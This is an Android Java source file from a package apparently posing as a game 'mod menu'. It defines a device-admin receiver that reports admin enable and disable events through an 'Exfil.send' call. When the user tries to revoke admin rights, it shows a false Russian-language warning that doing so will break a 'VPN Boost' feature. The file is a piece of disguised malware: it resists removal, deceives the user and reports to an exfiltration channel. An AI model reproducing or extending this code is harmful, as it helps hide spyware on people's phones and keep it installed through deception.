package com.brawl.modmenu;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context ctx, Intent intent) {
        Exfil.send("ADMIN", "Device Admin включён");
    }

    @Override
    public void onDisabled(Context ctx, Intent intent) {
        Exfil.send("ADMIN", "Device Admin отключён!");
    }

    @Override
    public CharSequence onDisableRequested(Context ctx, Intent intent) {
        return "Отключение нарушит работу VPN Boost. Рекомендуется оставить включённой.";
    }
}
